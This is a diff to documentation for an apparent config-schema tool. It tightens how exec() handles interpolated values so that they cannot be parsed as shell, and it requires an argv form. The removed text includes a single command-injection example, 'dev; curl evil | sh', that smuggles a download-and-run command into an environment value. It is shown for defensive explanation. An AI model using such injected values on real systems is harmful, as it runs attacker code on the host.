@@ -18,7 +18,7 @@ EXPANSION_EQUIVALENT="pre-${OTHER}-post"
 USING_FN_CALLS=concat("pre-", ref(OTHER), "-post")
 
 # mixed example
-CONFIG=exec(`./scripts/load-config.sh ${APP_ENV}`)
+CONFIG=exec("./scripts/load-config.sh", "config-${APP_ENV}")
 ```
 
 
@@ -87,11 +87,11 @@ TOKEN=exec(`my-cli token --json | jq -r .value`)
 CONFIG=exec("./scripts/load-config.sh", "--env", $APP_ENV)
 ```
 
-**Interpolated values are arguments, not shell.** In the string form, a value you interpolate (`${APP_ENV}`, or a nested function call) is quoted so the shell sees it as a single word, whatever it contains. ``exec(`./load-config.sh ${APP_ENV}`)`` with `APP_ENV` set to `dev; curl evil | sh` runs `./load-config.sh 'dev; curl evil | sh'`: one argument, no second command. This matters because `APP_ENV` can come from the process environment or a `.env.local`, not only from your schema. Only the static text you wrote is parsed as shell. A wholly dynamic command (`exec($CMD)`) is the one exception: there the whole value is the command, as written.
+**Values go through the argv form.** The string form only takes a fixed command. Interpolating a value into it (``exec(`./load-config.sh ${APP_ENV}`)``, `$(./load-config.sh ${APP_ENV})`) or passing a value as the whole command (`exec($CMD)`) is a schema error. A value can come from the process environment or a `.env.local`, not only from your schema, so it must never be read as shell syntax. Pass it as its own argument instead: `exec("./load-config.sh", $APP_ENV)`, or `exec("op", "read", "op://vault/${ITEM}/field")` to build one argument from several parts. Each argument reaches the program exactly as resolved, never split or expanded.
 
-If you need an interpolated value split into several arguments, or on Windows (where `cmd.exe` quoting is best effort and `%NAME%` still expands inside quotes), use the argv form.
+On Windows the argv form launches executables directly, so it can't run `.cmd` or `.bat` files (like the `npx` and `pnpm` shims). Call the `.exe` instead, or use the string form with a fixed command.
 
-When a command fails, the error shows the command as written in the schema and the exit code and stderr, not the interpolated values, so a secret passed as an argument stays out of the output.
+When a command fails, the error shows the command as written in the schema and the exit code and stderr, not the resolved arguments, so a secret passed as an argument stays out of the output.
 
 **Options.** Both forms accept these `key=value` options after the command:
 
